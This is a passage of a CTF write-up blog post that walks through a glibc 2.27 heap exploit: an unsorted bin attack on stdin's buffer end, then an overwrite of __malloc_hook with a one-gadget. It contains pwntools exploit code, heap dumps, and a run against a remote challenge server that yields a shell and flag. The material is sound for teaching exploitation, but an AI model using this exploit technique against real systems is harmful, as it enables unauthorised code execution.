<p>Then we should be able to control every byte between <code>&amp;stdin-&gt;_shortbuf</code> and <code>&amp;unsortedbin</code>. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: <code>__malloc_hook</code> !!</p>
<p>Then we just have to overwrite the pointers inside <code>stdin</code>, <code>_IO_wide_data_0</code> and <code>__memalign_hook</code> to finally reach <code>__malloc_hook</code> and write the address of a one-gadget !</p>
<h2 id="unsorted-bin-attack-on-stdin-_io_buf_end">Unsorted bin attack on stdin-&gt;_IO_buf_end</h2>
<p>Here was the theory, now let&rsquo;s see how we can do that. To understand unsorted bin attacks <a href="https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/">here</a> is a good article on the subject. The unsorted bin attack using partial unlink is basically:</p>
<ul>
<li>Overwrite the backward pointer of the last chunk in the unsorted bin by <code>&amp;target - 0x10</code>.</li>
<li>Request the <strong>exact</strong> size of the last chunk in the unsorted bin.</li>
<li>It should write at <code>&amp;target</code> the address of the unsorted bin.</li>
</ul>
<p>An essential thing to note is that if there are no chunks in your fastbin / smallbin and that you&rsquo;re requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn&rsquo;t fit the request, the program will most of the time issue a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519">code</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>
<span style="color:#a6e22e">_int_malloc</span> (mstate av, size_t bytes)
{

<span style="color:#75715e">// It checks first fastbin then smallbin then unsorted bin
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">for</span> (;; )
    {
      <span style="color:#66d9ef">int</span> iters <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
      <span style="color:#66d9ef">while</span> ((victim <span style="color:#f92672">=</span> unsorted_chunks (av)<span style="color:#f92672">-&gt;</span>bk) <span style="color:#f92672">!=</span> unsorted_chunks (av))
        {
          bck <span style="color:#f92672">=</span> victim<span style="color:#f92672">-&gt;</span>bk;
          <span style="color:#66d9ef">if</span> (__builtin_expect (chunksize_nomask (victim) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> SIZE_SZ, <span style="color:#ae81ff">0</span>)
              <span style="color:#f92672">||</span> __builtin_expect (chunksize_nomask (victim)
				   <span style="color:#f92672">&gt;</span> av<span style="color:#f92672">-&gt;</span>system_mem, <span style="color:#ae81ff">0</span>))
            malloc_printerr (<span style="color:#e6db74">&#34;malloc(): memory corruption&#34;</span>);
          size <span style="color:#f92672">=</span> chunksize (victim);

          <span style="color:#75715e">/*
</span><span style="color:#75715e">             If a small request, try to use last remainder if it is the
</span><span style="color:#75715e">             only chunk in unsorted bin. This helps promote locality for
</span><span style="color:#75715e">             runs of consecutive small requests. This is the only
</span><span style="color:#75715e">             exception to best-fit, and applies only when there is
</span><span style="color:#75715e">             no exact fit for a small chunk.
</span><span style="color:#75715e">           */</span>

          <span style="color:#66d9ef">if</span> (in_smallbin_range (nb) <span style="color:#f92672">&amp;&amp;</span>
              bck <span style="color:#f92672">==</span> unsorted_chunks (av) <span style="color:#f92672">&amp;&amp;</span>
              victim <span style="color:#f92672">==</span> av<span style="color:#f92672">-&gt;</span>last_remainder <span style="color:#f92672">&amp;&amp;</span>
              (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (size) <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (nb <span style="color:#f92672">+</span> MINSIZE))
            {
              <span style="color:#75715e">/* split and reattach remainder */</span>
              remainder_size <span style="color:#f92672">=</span> size <span style="color:#f92672">-</span> nb;
              remainder <span style="color:#f92672">=</span> chunk_at_offset (victim, nb);
              unsorted_chunks (av)<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> unsorted_chunks (av)<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> remainder;
              av<span style="color:#f92672">-&gt;</span>last_remainder <span style="color:#f92672">=</span> remainder;
              remainder<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> remainder<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> unsorted_chunks (av);
              <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>in_smallbin_range (remainder_size))
                {
                  remainder<span style="color:#f92672">-&gt;</span>fd_nextsize <span style="color:#f92672">=</span> NULL;
                  remainder<span style="color:#f92672">-&gt;</span>bk_nextsize <span style="color:#f92672">=</span> NULL;
                }

              set_head (victim, nb <span style="color:#f92672">|</span> PREV_INUSE <span style="color:#f92672">|</span>
                        (av <span style="color:#f92672">!=</span> <span style="color:#f92672">&amp;</span>main_arena <span style="color:#f92672">?</span> NON_MAIN_ARENA : <span style="color:#ae81ff">0</span>));
              set_head (remainder, remainder_size <span style="color:#f92672">|</span> PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> chunk2mem (victim);
              alloc_perturb (p, bytes);
              <span style="color:#66d9ef">return</span> p;
            }

          <span style="color:#75715e">/* remove from unsorted list */</span>
          unsorted_chunks (av)<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">=</span> bck;
          bck<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">=</span> unsorted_chunks (av);

          <span style="color:#75715e">/* Take now instead of binning if exact fit */</span>

          <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">==</span> nb)
            {
              set_inuse_bit_at_offset (victim, size);
              <span style="color:#66d9ef">if</span> (av <span style="color:#f92672">!=</span> <span style="color:#f92672">&amp;</span>main_arena)
		set_non_main_arena (victim);
<span style="color:#75715e">#if USE_TCACHE
</span><span style="color:#75715e"></span>	      <span style="color:#75715e">/* Fill cache first, return to user only if cache fills.
</span><span style="color:#75715e">		 We may return one of these chunks later.  */</span>
	      <span style="color:#66d9ef">if</span> (tcache_nb
		  <span style="color:#f92672">&amp;&amp;</span> tcache<span style="color:#f92672">-&gt;</span>counts[tc_idx] <span style="color:#f92672">&lt;</span> mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
		  <span style="color:#66d9ef">continue</span>;
		}
	      <span style="color:#66d9ef">else</span>
		{
<span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>              check_malloced_chunk (av, victim, nb);
              <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> chunk2mem (victim);
              alloc_perturb (p, bytes);
              <span style="color:#66d9ef">return</span> p;
<span style="color:#75715e">#if USE_TCACHE
</span><span style="color:#75715e"></span>		}
<span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>            }

	[...]
}
</code></pre></div><p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin to the fastbin:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Before:
</span><span style="color:#e6db74">0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span style="color:#e6db74">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
</span><span style="color:#e6db74">unsortedbin
</span><span style="color:#e6db74">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

add(<span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">55</span>) <span style="color:#75715e"># pop it to access to chunk_1</span>

add(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># restore valid fastbin chunk part of the 0x30 freelist</span>
<span style="color:#75715e"># put it back to the fastbin </span>

add(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">40</span>, pwn<span style="color:#f92672">.</span>p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3ebca0</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>))
<span style="color:#75715e"># Write after free, &amp;stdin-&gt;_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header</span>

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">After:
</span><span style="color:#e6db74">0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0
</span><span style="color:#e6db74">unsortedbin
</span><span style="color:#e6db74">all [corrupted]
</span><span style="color:#e6db74">FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
</span><span style="color:#e6db74">BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelists. That&rsquo;s the last step of the unsortedbin attack, clean out the fastbin:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Before: same as above
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#75715e"># == clean fastbin</span>

freexalloc(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)

freexalloc(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
add(<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x40</span><span style="color:#e6db74">&#34;</span>)

freexalloc(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
add(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">56</span>, pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>))

freexalloc(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">560</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, doubleFree<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
add(<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">56</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30</span><span style="color:#e6db74">&#34;</span>)

add(<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)

<span style="color:#75715e"># == clean fastbin</span>

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">fastbins
</span><span style="color:#e6db74">0x30: 0x0
</span><span style="color:#e6db74">0x40: 0x0
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>Now we just have to ask for a <code>0x30</code> sized chunk:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1337&#34;</span>, hang<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;unsortedbin attack done on: </span><span style="color:#e6db74">{</span>hex(stdin <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Enjoy your shell!&#34;</span>)

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">After:
</span><span style="color:#e6db74">0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfca0 &lt;- stdin-&gt;_IO_buf_end
</span><span style="color:#e6db74">0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0 &lt;- unsortedbin
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><h2 id="fsop--profit">FSOP + PROFIT</h2>
<p>The last part is very easy, we just have to overflow up to <code>&amp;__malloc_hook</code> to write the one-gadget:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>) 
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>) 
io<span style="color:#f92672">.</span>send( 
        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4</span><span style="color:#ae81ff">\n\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3ed8d0</span>) <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0xffffffffffffffff</span>) <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3ebae0</span>) <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x00000000ffffffff</span>) <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3e82a0</span>) <span style="color:#f92672">+</span> 
        pwn<span style="color:#f92672">.</span>p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x150</span> <span style="color:#f92672">+</span>  
        <span style="color:#75715e"># !!!!! </span>
        pwn<span style="color:#f92672">.</span>p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10a38c</span>) <span style="color:#75715e"># &lt;- one-gadget</span>
        <span style="color:#75715e">#pwn.p64(libc + 0x4f322) </span>
        <span style="color:#75715e"># pwn.p64(0x1337) </span>
        )
<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x10a38c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
</span><span style="color:#e6db74">constraints:
</span><span style="color:#e6db74">  [rsp+0x70] == NULL
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate anymore standards chunks) which will trigger <code>__malloc_hook</code> :).</p>
<p>Which gives:</p>
<pre tabindex="0"><code>root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
[*] '/mnt/once_and_for_all'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/mnt/out'
[+] Opening connection to 167.172.56.180 on port 30332: Done
[*] Switching to interactive mode

How much space do you need for this massive weapon: Adding to your inventory..
$ id
uid=100(ctf) gid=101(ctf)
$ ls
flag.txt
glibc
once_and_for_all
$ cat flag.txt
HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
</code></pre>
                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">Last modified on 2022-05-19</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts">
			Next<br>No newer posts.
                </a>
                
                
                
                <a class="older-posts" href="https://clubsecu-esiea.github.io/posts/about/">
			Previous<br>About us
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                


<div id="gitalk-container"></div>









            </div>
        </div>
    </div>


                    </div>
            </div><div id="single-column-footer">
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	Beerware shit
	
</div>
            </div>
    
    <script src="/js/journal.js"></script>
    </body>
</html>
